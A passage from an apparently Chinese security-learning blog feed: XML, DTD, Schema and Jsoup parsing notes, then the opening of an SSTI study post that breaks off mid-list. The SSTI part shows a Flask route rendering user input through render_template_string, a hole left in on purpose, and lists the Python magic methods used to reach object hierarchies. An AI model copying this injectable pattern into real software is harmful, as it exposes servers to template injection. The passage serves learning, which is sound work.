</span><br></pre></td></tr></table></figure></div><blockquote><p>因使用属性而引起的一些问题：</p><ul><li>属性无法包含多重的值（元素可以）</li><li>属性无法描述树结构（元素可以）</li><li>属性不易扩展（为未来的变化）</li><li>属性难以阅读和维护</li></ul></blockquote><p><strong>元数据（有关数据的数据）应当存储为属性，而数据本身应当存储为元素</strong></p><p>有时候会向元素分配 ID 引用。这些 ID 索引可用于标识 XML 元素，它起作用的方式与 HTML 中 ID 属性是一样的</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">messages</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;501&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;502&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>John<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>George<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Re: Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>I will not<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">messages</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="XML验证"><a href="#XML验证" class="headerlink" title="XML验证"></a>XML验证</h2><p>拥有正确语法的 XML 被称为“形式良好”的 XML。</p><p>通过 DTD 验证的 XML 是“合法”的 XML。</p><h3 id="XML-Schema"><a href="#XML-Schema" class="headerlink" title="XML Schema"></a>XML Schema</h3><p>W3C 支持一种基于 XML 的 DTD 代替者，它名为 XML Schema：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;note&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span>      <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;from&quot;</span>    <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;heading&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span>    <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:element</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><h3 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h3><p>DTD 的作用是定义 XML 文档的结构。它使用一系列合法的元素来定义文档结构：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note [ &lt;!--DOCTYPE 声明是对外部 DTD 文件的引用--&gt;</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure></div><h2 id="XML-CSS"><a href="#XML-CSS" class="headerlink" title="XML CSS"></a>XML CSS</h2><p>XML可以连接到CSS文件并被其格式化，呈现在网页上 </p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;cd_catalog.css&quot;</span>?&gt;</span> <span class="comment">&lt;!--把这个XML文件链接到CSS文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CATALOG</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">CD</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Empire Burlesque<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Bob Dylan<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>Columbia<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PRICE</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">PRICE</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1985<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">CD</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">CD</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Hide your heart<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Bonnie Tyler<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>CBS Records<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PRICE</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">PRICE</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1988<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">CD</span>&gt;</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="tag">&lt;/<span class="name">CATALOG</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>使用 CSS 格式化 XML 不是常用的方法，更不能代表 XML 文档样式化的未来。W3C 推荐使用 XSLT</p></blockquote><h2 id="XML-XSLT"><a href="#XML-XSLT" class="headerlink" title="XML XSLT"></a>XML XSLT</h2><p>XSLT 是首选的 XML 样式表语言。</p><p>XSLT (eXtensible Stylesheet Language Transformations) 远比 CSS 更加完善。</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;simple.xsl&quot;</span>?&gt;</span> <span class="comment">&lt;!--把这个XML文件链接到XSL文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">breakfast_menu</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">food</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Belgian Waffles<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>$5.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">       two of our famous Belgian Waffles</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">calories</span>&gt;</span>650<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">breakfast_menu</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>在使用 XSLT 来转换 XML 时，不同的浏览器可能会产生不同结果。为了减少这种问题，可以在服务器上进行 XSLT 转换。</p></blockquote><p>DOM 将 XML 文档作为一个树形结构，而树叶被定义为<strong>节点</strong></p><p>以书店文档为例</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1o9tjk5xoj20l60bejs6.jpg"                      alt="image-20220427143813504" style="zoom: 50%;"                 ><figcaption>image-20220427143813504</figcaption></figure><h2 id="XML约束"><a href="#XML约束" class="headerlink" title="XML约束"></a>XML约束</h2><ul><li><p>约束：规定xml文档的书写规则</p><ul><li><p>作为框架的使用者(程序员)：</p><ol><li>能够在xml中引入约束文档</li><li>能够简单的读懂约束文档</li></ol></li><li><p>分类：</p><ol><li>DTD:一种简单的约束技术</li><li>Schema:一种复杂的约束技术</li></ol></li></ul></li></ul><h3 id="DTD："><a href="#DTD：" class="headerlink" title="DTD："></a>DTD：</h3><ul><li>引入dtd文档到xml文档中<ul><li>内部dtd：将约束规则定义在xml文档中</li><li>外部dtd：将约束的规则定义在外部的dtd文件中<ul><li>本地：<!DOCTYPE 根标签名 SYSTEM "dtd文件的位置"></li><li>网络：<!DOCTYPE 根标签名 PUBLIC "dtd文件名字" "dtd文件的位置URL"></li></ul></li></ul></li></ul><h3 id="Schema"><a href="#Schema" class="headerlink" title="Schema:"></a>Schema:</h3><p>可以自定义类型，给标签内容更多的规定</p><ul><li>引入：<ol><li>填写xml文档的根元素</li><li>引入xsi命名空间(xsi标准命名空间，有多种取值 分别对应不同版本).  xmlns:xsi&#x3D;”<a class="link"   href="http://www.w3.org/2001/XMLSchema-instance" >http://www.w3.org/2001/XMLSchema-instance <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</li><li>为每个命名空间指定具体的schema文件 两两一对  <code>xsi:schemaLocation=&quot;http://www.itcast.cn/xml student.xsd&quot;</code> </li><li>为每一个xsd约束声明一个前缀,作为标识  xmlns&#x3D;”<a class="link"   href="http://www.itcast.cn/xml" >http://www.itcast.cn/xml <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ (xmlns定义默认命名空间，只引一个约束文档时，可以不加前缀，为空前缀，可以直接使用标签，默认所有标签都用这个文档)<ul><li>加前缀版(自定义命名空间，给命名空间取别名，其赋值必须是个命名空间文件 必须在xsi命名空间内指定其对应的schema文件)：xmlns:a&#x3D;”<a class="link"   href="http://www.itcast.cn/xml1" >http://www.itcast.cn/xml1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“  使用该约束文档的标签都要加前缀 如<code>&lt;a:age&gt;&lt;/a:age&gt;</code></li></ul></li></ol></li></ul><blockquote><p>根标签内引入</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">students</span>   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://www.itcast.cn/xml&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.itcast.cn/xml  student.xsd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4lrp1a2m5j21ho0q6n3h.jpg"                      alt="image-20220727204100444"                ><figcaption>image-20220727204100444</figcaption></figure></p><h2 id="XML解析"><a href="#XML解析" class="headerlink" title="XML解析"></a>XML解析</h2><p>解析：操作xml文档，将文档中的数据读取到内存中</p><ul><li><p>操作xml文档</p><ol><li>解析(读取)：将文档中的数据读取到内存中</li><li>写入：将内存中的数据保存到xml文档中。持久化的存储</li></ol></li><li><p>解析xml的方式：</p><ol><li>DOM：将标记语言文档一次性加载进内存，在内存中形成一颗dom树</li></ol><p>  <figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4lrrg091cj20mw0fcq3p.jpg"                      alt="image-20220727204321916"                ><figcaption>image-20220727204321916</figcaption></figure></p><ul><li>优点：操作方便，可以对文档进行CRUD的所有操作</li><li>缺点：占内存</li></ul><ol start="2"><li>SAX：逐行读取(自动释放上一行)，基于事件驱动的。</li></ol><ul><li>优点：不占内存。</li><li>缺点：只能读取，不能增删改</li></ul></li></ul><h3 id="xml常见的解析器："><a href="#xml常见的解析器：" class="headerlink" title="xml常见的解析器："></a>xml常见的解析器：</h3><p>​1. JAXP：sun公司提供的解析器，支持dom和sax两种思想<br>​2. DOM4J：一款非常优秀的解析器<br>​3. Jsoup：jsoup 是一款Java 的HTML解析器，可直接解析某个URL地址、HTML文本内容。它提供了一套非常省力的API，可通过DOM，CSS以及类似于jQuery的操作方法来取出和操作数据。<br>​4. PULL：Android操作系统内置的解析器，sax方式的。</p><h3 id="Jsoup"><a href="#Jsoup" class="headerlink" title="Jsoup"></a>Jsoup</h3><p>jsoup 是一款Java 的HTML解析器，可直接解析某个URL地址、HTML文本内容。它提供了一套非常省力的API，可通过DOM，CSS以及类似于jQuery的操作方法来取出和操作数据。</p><ul><li><p>快速入门：</p><ul><li>步骤：<ol><li>导入jar包</li><li>获取Document对象</li><li>获取对应的标签Element对象</li><li>获取数据</li></ol></li></ul></li><li><p>代码：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取Document对象,根据xml文档获取</span></span><br><span class="line"><span class="comment">//获取student.xml的path</span></span><br><span class="line">String path= JsoupDemo1.class.getClassLoader().getResource(<span class="string">&quot;student.xml&quot;</span>).toURI().getPath();</span><br><span class="line"><span class="comment">//解析xml文档，加载文档进内存，获取dom树--&gt;Document</span></span><br><span class="line"><span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//获取元素对象 Element</span></span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements</span> <span class="operator">=</span> document.getElementsByTag(<span class="string">&quot;name&quot;</span>);<span class="comment">//Elements是ArrayList&lt;Element&gt;</span></span><br><span class="line">System.out.println(elements.size());</span><br><span class="line"><span class="comment">//获取第一个name的Element对象</span></span><br><span class="line"><span class="type">Element</span> <span class="variable">element</span> <span class="operator">=</span> elements.get(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//获取数据</span></span><br><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> element.text();</span><br><span class="line">System.out.println(text);</span><br></pre></td></tr></table></figure></div><blockquote><p>路径中有中文或空格时，要先toURI再getPath</p></blockquote></li><li><p>对象的使用：</p><ol><li>Jsoup：工具类，可以解析html或xml文档，返回Document<ul><li>parse：解析html或xml文档，返回Document<ul><li>parse(File in, String charsetName)：解析xml或html文件的。</li><li>parse(String html)：解析xml或html字符串</li><li>parse(URL url, int timeoutMillis)：通过网络路径获取指定的html或xml的文档对象</li></ul></li></ul></li><li>Document：文档对象。代表内存中的dom树<ul><li>获取Element对象<ul><li>getElementById(String id)：根据id属性值获取唯一的element对象</li><li>getElementsByTag(String tagName)：根据标签名称获取元素对象集合</li><li>getElementsByAttribute(String key)：根据属性名称获取元素对象集合</li><li>getElementsByAttributeValue(String key, String value)：根据对应的属性名和属性值获取元素对象集合</li></ul></li></ul></li><li>Elements：元素Element对象的集合。可以当做 ArrayList<Element>来使用</li><li>Element：元素对象<ol><li><p>获取子元素对象</p><ul><li>getElementById(String id)：根据id属性值获取唯一的element对象</li><li>getElementsByTag(String tagName)：根据标签名称获取元素对象集合</li><li>getElementsByAttribute(String key)：根据属性名称获取元素对象集合</li><li>getElementsByAttributeValue(String key, String value)：根据对应的属性名和属性值获取元素对象集合</li></ul></li><li><p>获取属性值</p><ul><li>String attr(String key)：根据属性名称(大小写不敏感)获取属性值</li></ul></li><li><p>获取文本内容</p><ul><li>String text():获取文本内容（所有子标签的纯文本内容拼接，不包含标签名及&lt;&gt;）</li><li>String html():获取标签体的所有内容(包括子标签的字符串内容,包含标签名及&lt;&gt;)</li></ul></li></ol></li><li>Node：节点对象<ul><li>是Document和Element的父类</li></ul></li></ol></li></ul><ul><li><p>快捷查询方式：</p><ol><li><p>selector:选择器</p><ul><li><p>使用的方法：Elementsselect(String cssQuery) </p><ul><li>语法：参考Selector类中定义的语法</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//选择器查询</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo1.class.getClassLoader().getResource(<span class="string">&quot;student.xml&quot;</span>).toURI().getPath();</span><br><span class="line"><span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//获取name标签</span></span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements</span> <span class="operator">=</span> document.select(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">System.out.println(elements);</span><br><span class="line"><span class="comment">//获取id=&quot;itcast&quot;的元素</span></span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements1</span> <span class="operator">=</span> document.select(<span class="string">&quot;#itcast&quot;</span>);</span><br><span class="line">System.out.println(elements1);</span><br><span class="line">System.out.println(<span class="string">&quot;-------&quot;</span>);</span><br><span class="line"><span class="comment">//获取student标签下number=&quot;heima_0001的age子标签</span></span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements2</span> <span class="operator">=</span> document.select(<span class="string">&quot;student[number=&#x27;heima_0001&#x27;]&quot;</span>);</span><br><span class="line">System.out.println(elements2);</span><br><span class="line"><span class="type">Elements</span> <span class="variable">elements3</span> <span class="operator">=</span> document.select(<span class="string">&quot;student[number=&#x27;heima_0001&#x27;] &gt; age&quot;</span>);</span><br><span class="line"><span class="comment">//得到age</span></span><br><span class="line">System.out.println(elements3);</span><br></pre></td></tr></table></figure></div></li></ul></li><li><p>XPath：XPath即为XML路径语言，它是一种用来确定XML（标准通用标记语言的子集）文档中某部分位置的语言</p><ul><li>使用Jsoup的Xpath需要额外导入jar包。</li><li>查询w3cshool参考手册，使用xpath的语法完成查询</li><li>代码：</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo1.class.getClassLoader().getResource(<span class="string">&quot;student.xml&quot;</span>).toURI().getPath();</span><br><span class="line"><span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//根据document对象，创建JXDocument对象</span></span><br><span class="line">JXDocument jxDocument=<span class="keyword">new</span> <span class="title class_">JXDocument</span>(document);</span><br><span class="line"><span class="comment">//结合Xpath语法查询</span></span><br><span class="line">List&lt;JXNode&gt; jxNodes = jxDocument.selN(<span class="string">&quot;//student&quot;</span>); <span class="comment">// &#x27;//&#x27;表示当前节点</span></span><br><span class="line"><span class="keyword">for</span> (JXNode jxNode: jxNodes) &#123;</span><br><span class="line">    System.out.println(jxNode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询所有student标签下的name标签</span></span><br><span class="line">List&lt;JXNode&gt; jxNodes1 = jxDocument.selN(<span class="string">&quot;//student/name&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (JXNode j: jxNodes1) &#123;</span><br><span class="line">    System.out.println(j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询student标签下带有id属性的name标签</span></span><br><span class="line">List&lt;JXNode&gt; jxNodes3 = jxDocument.selN(<span class="string">&quot;//student/name[@id]&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (JXNode jxNode : jxNodes3) &#123;</span><br><span class="line">    System.out.println(jxNode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询student标签下带有id属性的name标签 并且id属性值为itcast</span></span><br><span class="line">List&lt;JXNode&gt; jxNodes4 = jxDocument.selN(<span class="string">&quot;//student/name[@id=&#x27;itcast&#x27;]&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (JXNode jxNode : jxNodes4) &#123;</span><br><span class="line">    System.out.println(jxNode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI原理学习</title>
      <link href="/2022/04/03/SSTI%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/03/SSTI%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI原理学习"><a href="#SSTI原理学习" class="headerlink" title="SSTI原理学习"></a><strong>SSTI原理学习</strong></h1><h2 id="Flask框架"><a href="#Flask框架" class="headerlink" title="Flask框架"></a>Flask框架</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)  </span><br><span class="line"><span class="comment"># app是Flask的实例，它接收包或者模块的名字作为参数，但一般都是传递__name__</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test/&#x27;</span></span>)  </span><span class="comment"># 在运行实体上绑定URL路由</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % code</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 运行Flash实体，如果要让网络上的人也可以访问，运行app.run(host=’0.0.0.0’)</span></span><br><span class="line"><span class="comment"># Flask类只有一个必须指定的参数，即程序主模块或者包的名字，__name__是系统变量，该变量指的是本py文件的文件名</span></span><br></pre></td></tr></table></figure></div><h2 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__class__            <span class="comment"># 类的一个内置属性，表示实例对象的类。(沿着实例虚线箭头向上跳一级，对&lt;class &#x27;type&#x27;&gt;一直使用，仍返回&lt;class &#x27;type&#x27;&gt;，不会跳到object)调用的时候会屏蔽类内定义的同名属性__class__</span></span><br><span class="line">__base__             <span class="comment"># 类型对象的一个直接基类(父类)(沿着继承实线箭头向上跳一级)</span></span><br><span class="line">__bases__            <span class="comment"># 类型对象的全部基类(得是直接继承的，不能是通过继承的传递性的)，以元组形式展示，类型的实例通常没有属性 __bases__</span></span><br><span class="line">__mro__              <span class="comment"># 